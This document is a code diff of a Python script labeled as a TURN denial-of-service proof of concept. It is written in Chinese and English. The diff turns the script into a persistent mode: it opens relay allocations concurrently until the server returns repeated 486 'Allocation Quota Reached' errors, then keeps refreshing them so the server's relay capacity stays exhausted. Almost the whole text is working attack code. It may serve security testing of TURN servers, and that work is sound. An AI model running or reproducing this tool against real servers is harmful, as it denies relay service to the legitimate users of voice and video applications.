@@ -27,7 +27,6 @@ from turn_utils.turn_client import (
     STUN_ATTR_NONCE,
     STUN_ATTR_MESSAGE_INTEGRITY,
     STUN_ATTR_FINGERPRINT,
-    STUN_ATTR_LIFETIME,
     STUN_MAGIC_COOKIE,
     resolve_server_address
 )
@@ -44,6 +43,7 @@ STUN_REFRESH_REQUEST = 0x0004
 STUN_REFRESH_SUCCESS_RESPONSE = 0x0104
 STUN_REFRESH_ERROR_RESPONSE = 0x0114
 STUN_ATTR_ERROR_CODE = 0x0009
+STUN_ATTR_LIFETIME = 0x000D  # RFC 8656 Section 18.2
 
 # 全局统计
 stats = {
@@ -51,9 +51,15 @@ stats = {
     'successful_allocations': 0,
     'failed_allocations': 0,
     'active_allocations': 0,
-    'errors': defaultdict(int)
+    'errors': defaultdict(int),
+    'error_486_count': 0,  # 486错误计数
+    'recent_486_count': 0,  # 最近486错误计数（用于判断是否频繁）
 }
 stats_lock = threading.Lock()
+
+# 控制是否继续allocate
+should_continue_allocating = True
+should_continue_lock = threading.Lock()
 
 # 存储活跃的allocation
 active_allocations = []
@@ -183,22 +189,28 @@ def keep_allocation_alive(allocation_info, server_address, username, refresh_int
 
 def attempt_allocation(server_address, username, password, realm, server_hostname, allocation_id):
     """
-    尝试单个allocation请求
+    尝试单个allocation请求，检测486错误
     
     Returns:
-        (success, allocation_info, error_msg) 或 (False, None, error_msg)
+        (success, allocation_info, error_code) 
+        success: True/False
+        allocation_info: 成功时的allocation信息，失败时为None
+        error_code: 错误码（如486），成功时为None
     """
     try:
         with stats_lock:
             stats['total_requests'] += 1
         
-        result, is_short_term = allocate_with_fallback(
-            server_address,
-            username,
-            password,
-            realm,
-            server_hostname,
-        )
+        # 直接调用allocate_single_server以获取错误码
+        from turn_utils.turn_client import allocate_single_server, STUN_ATTR_ERROR_CODE, STUN_ALLOCATE_ERROR_RESPONSE
+        
+        # 先尝试长期凭证
+        result = allocate_single_server(server_address, username, password, realm, use_short_term_credential=False)
+        
+        # 如果失败，检查是否是486错误
+        if not result:
+            # 尝试短期凭证
+            result = allocate_single_server(server_address, username, password, realm, use_short_term_credential=True)
         
         if result:
             sock, nonce, realm, integrity_key, actual_server_address, *extra = result
@@ -211,16 +223,54 @@ def attempt_allocation(server_address, username, password, realm, server_hostnam
             with stats_lock:
                 stats['successful_allocations'] += 1
                 stats['active_allocations'] = len(active_allocations)
+                # 成功时重置最近486计数
+                stats['recent_486_count'] = 0
             
             print(f"[+] Allocation #{allocation_id} successful (Total: {stats['successful_allocations']}/{stats['total_requests']})")
             return True, allocation_info, None
         else:
+            # 需要检查错误码，但allocate_single_server不返回错误码
+            # 我们需要重新发送请求来检查错误码
+            import socket
+            from turn_utils.turn_client import build_msg, stun_attr, gen_tid, STUN_ALLOCATE_REQUEST, parse_attrs, STUN_ATTR_REQUESTED_TRANSPORT
+            
+            check_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            check_sock.settimeout(3)
+            try:
+                # 发送一个简单的请求来检查错误码
+                tid = gen_tid()
+                req = build_msg(STUN_ALLOCATE_REQUEST, tid, [
+                    stun_attr(STUN_ATTR_REQUESTED_TRANSPORT, struct.pack("!B3s", 17, b"\x00\x00\x00"))
+                ])
+                check_sock.sendto(req, server_address)
+                data, _ = check_sock.recvfrom(2000)
+                msg_type, tid, attrs = parse_attrs(data)
+                
+                if msg_type == STUN_ALLOCATE_ERROR_RESPONSE:
+                    error_code = attrs.get(STUN_ATTR_ERROR_CODE)
+                    if error_code and len(error_code) >= 4:
+                        error_class = error_code[2]
+                        error_number = error_code[3]
+                        error_code_value = error_class * 100 + error_number
+                        
+                        if error_code_value == 486:  # Allocation Quota Reached
+                            with stats_lock:
+                                stats['error_486_count'] += 1
+                                stats['recent_486_count'] += 1
+                            print(f"[-] Allocation #{allocation_id} failed: 486 Allocation Quota Reached (Total 486: {stats['error_486_count']})")
+                            check_sock.close()
+                            return False, None, 486
+            except:
+                pass
+            finally:
+                check_sock.close()
+            
             with stats_lock:
                 stats['failed_allocations'] += 1
                 stats['errors']['allocation_failed'] += 1
             
             print(f"[-] Allocation #{allocation_id} failed (Total: {stats['failed_allocations']}/{stats['total_requests']})")
-            return False, None, "Allocation failed"
+            return False, None, None
     
     except Exception as e:
         error_msg = str(e)
@@ -229,7 +279,7 @@ def attempt_allocation(server_address, username, password, realm, server_hostnam
             stats['errors'][error_msg] += 1
         
         print(f"[-] Allocation #{allocation_id} error: {error_msg}")
-        return False, None, error_msg
+        return False, None, None
 
 def print_stats():
     """打印统计信息"""
@@ -248,24 +298,21 @@ def print_stats():
         print("="*70 + "\n")
 
 def main():
-    parser = argparse.ArgumentParser(description='TURN DoS攻击POC - 攻击1：占满所有可申请的中继端口')
+    parser = argparse.ArgumentParser(description='TURN DoS攻击POC - 攻击1：持续占满所有可申请的中继端口')
     parser.add_argument('--turn-server', required=True, help='TURN服务器地址（域名或IP）')
     parser.add_argument('--turn-port', type=int, help='TURN服务器端口')
     parser.add_argument('--username', required=True, help='TURN服务器用户名')
     parser.add_argument('--password', required=True, help='TURN服务器密码')
     parser.add_argument('--realm', help='TURN服务器认证域')
-    parser.add_argument('--num-requests', type=int, default=100, help='要发送的allocation请求数量（默认: 100）')
     parser.add_argument('--concurrent', type=int, default=10, help='并发请求数（默认: 10）')
-    parser.add_argument('--keep-alive', action='store_true', default=True, help='保持allocation活跃（定期refresh，默认启用）')
-    parser.add_argument('--no-keep-alive', dest='keep_alive', action='store_false', help='禁用保持allocation活跃')
     parser.add_argument('--refresh-interval', type=int, default=300, help='Refresh间隔（秒，默认: 300）')
     parser.add_argument('--monitor-interval', type=int, default=5, help='统计信息打印间隔（秒，默认: 5）')
-    parser.add_argument('--stop-on-full', action='store_true', help='当无法再分配时停止（检测到486错误）')
+    parser.add_argument('--486-threshold', dest='error_486_threshold', type=int, default=5, help='连续486错误阈值，超过此值停止新分配（默认: 5）')
     
     args = parser.parse_args()
     
     print("="*70)
-    print("🚨 TURN DoS攻击POC - 攻击1")
+    print("🚨 TURN DoS攻击POC - 攻击1（持续模式）")
     print("="*70)
     
     # 解析TURN服务器地址
@@ -276,11 +323,10 @@ def main():
     
     print(f"[+] TURN Server: {server_address}")
     print(f"[+] Username: {args.username}")
-    print(f"[+] 请求数量: {args.num_requests}")
     print(f"[+] 并发数: {args.concurrent}")
-    print(f"[+] 保持活跃: {args.keep_alive}")
-    if args.keep_alive:
-        print(f"[+] Refresh间隔: {args.refresh_interval}秒")
+    print(f"[+] Refresh间隔: {args.refresh_interval}秒")
+    print(f"[+] 486错误阈值: {args.error_486_threshold}（连续{args.error_486_threshold}次486错误后停止新分配）")
+    print(f"[+] 模式: 持续allocate直到频繁遇到486错误，然后持续refresh")
     print()
     
     # 启动统计信息监控线程
@@ -294,19 +340,35 @@ def main():
     monitor_thread = threading.Thread(target=monitor_stats, daemon=True)
     monitor_thread.start()
     
-    # 启动keep-alive线程池
-    keep_alive_executor = None
-    if args.keep_alive:
-        keep_alive_executor = ThreadPoolExecutor(max_workers=args.concurrent * 2)
+    # 启动keep-alive线程池（总是启用）
+    keep_alive_executor = ThreadPoolExecutor(max_workers=args.concurrent * 2)
     
     start_time = time.time()
+    allocation_counter = 0
     
     try:
-        # 使用线程池并发发送allocation请求
+        # 持续allocate直到频繁遇到486错误
         with ThreadPoolExecutor(max_workers=args.concurrent) as executor:
-            futures = []
+            pending_futures = []
             
-            for i in range(args.num_requests):
+            while True:
+                # 检查是否应该继续allocate
+                with should_continue_lock:
+                    if not should_continue_allocating:
+                        print("[!] 检测到频繁486错误，停止发送新的allocation请求")
+                        print("[!] 将继续refresh已有的allocation...")
+                        break
+                
+                # 检查最近486错误计数
+                with stats_lock:
+                    if stats['recent_486_count'] >= args.error_486_threshold:
+                        with should_continue_lock:
+                            should_continue_allocating = False
+                        print(f"[!] 检测到连续{stats['recent_486_count']}次486错误，停止新分配")
+                        break
+                
+                # 提交新的allocation请求
+                allocation_counter += 1
                 future = executor.submit(
                     attempt_allocation,
                     server_address,
@@ -314,31 +376,54 @@ def main():
                     args.password,
                     args.realm,
                     args.turn_server,
-                    i + 1
+                    allocation_counter
                 )
-                futures.append(future)
+                pending_futures.append(future)
                 
-                # 如果设置了stop-on-full，检查是否已经无法分配
-                if args.stop_on_full and stats['failed_allocations'] > 0:
-                    # 检查最近的失败是否是因为配额已满
-                    # 这里简化处理，如果连续失败多次就停止
-                    if stats['failed_allocations'] >= 10 and stats['successful_allocations'] == 0:
-                        print("[!] 检测到可能无法分配，停止发送新请求")
-                        break
+                # 处理已完成的请求
+                completed_futures = [f for f in pending_futures if f.done()]
+                for future in completed_futures:
+                    pending_futures.remove(future)
+                    try:
+                        success, allocation_info, error_code = future.result()
+                        
+                        # 如果成功，启动keep-alive线程
+                        if success and allocation_info:
+                            keep_alive_executor.submit(
+                                keep_allocation_alive,
+                                allocation_info,
+                                server_address,
+                                args.username,
+                                args.refresh_interval
+                            )
+                        
+                        # 如果遇到486错误，更新统计
+                        if error_code == 486:
+                            with stats_lock:
+                                if stats['recent_486_count'] >= args.error_486_threshold:
+                                    with should_continue_lock:
+                                        should_continue_allocating = False
+                    except Exception as e:
+                        print(f"[!] 处理allocation结果时出错: {e}")
+                
+                # 短暂延迟，避免请求过快
+                time.sleep(0.1)
             
-            # 等待所有请求完成
-            for future in as_completed(futures):
-                success, allocation_info, error_msg = future.result()
-                
-                # 如果成功且需要保持活跃，启动keep-alive线程
-                if success and args.keep_alive and allocation_info:
-                    keep_alive_executor.submit(
-                        keep_allocation_alive,
-                        allocation_info,
-                        server_address,
-                        args.username,
-                        args.refresh_interval
-                    )
+            # 等待所有pending请求完成
+            print("[+] 等待所有pending请求完成...")
+            for future in pending_futures:
+                try:
+                    success, allocation_info, error_code = future.result()
+                    if success and allocation_info:
+                        keep_alive_executor.submit(
+                            keep_allocation_alive,
+                            allocation_info,
+                            server_address,
+                            args.username,
+                            args.refresh_interval
+                        )
+                except Exception as e:
+                    print(f"[!] 处理pending allocation时出错: {e}")
     
     except KeyboardInterrupt:
         print("\n[!] 用户中断")
@@ -351,34 +436,33 @@ def main():
         print_stats()
         
         elapsed_time = time.time() - start_time
-        print(f"\n[+] 攻击完成，耗时: {elapsed_time:.2f}秒")
+        print(f"\n[+] Allocation阶段完成，耗时: {elapsed_time:.2f}秒")
         print(f"[+] 成功分配: {stats['successful_allocations']}/{stats['total_requests']}")
+        print(f"[+] 486错误总数: {stats['error_486_count']}")
         print(f"[+] 当前活跃分配: {stats['active_allocations']}")
+        print(f"\n[+] 进入持续refresh模式，allocation将持续刷新...")
+        print(f"[+] 按 Ctrl+C 停止并清理所有allocation")
         
-        if args.keep_alive:
-            print(f"\n[+] 保持活跃模式已启用，allocation将持续刷新...")
-            print(f"[+] 按 Ctrl+C 停止并清理所有allocation")
-            
-            try:
-                while True:
-                    time.sleep(1)
+        try:
+            while True:
+                time.sleep(1)
+                with stats_lock:
                     if stats['active_allocations'] == 0:
                         print("[!] 所有allocation已失效")
                         break
-            except KeyboardInterrupt:
-                print("\n[!] 清理所有allocation...")
-                with allocations_lock:
-                    for allocation_info in active_allocations[:]:
-                        try:
-                            sock = allocation_info[0]
-                            sock.close()
-                        except:
-                            pass
-                    active_allocations.clear()
-                print("[+] 清理完成")
+        except KeyboardInterrupt:
+            print("\n[!] 清理所有allocation...")
+            with allocations_lock:
+                for allocation_info in active_allocations[:]:
+                    try:
+                        sock = allocation_info[0]
+                        sock.close()
+                    except:
+                        pass
+                active_allocations.clear()
+            print("[+] 清理完成")
         
-        if keep_alive_executor:
-            keep_alive_executor.shutdown(wait=False)
+        keep_alive_executor.shutdown(wait=False)
 
 if __name__ == "__main__":
     main()
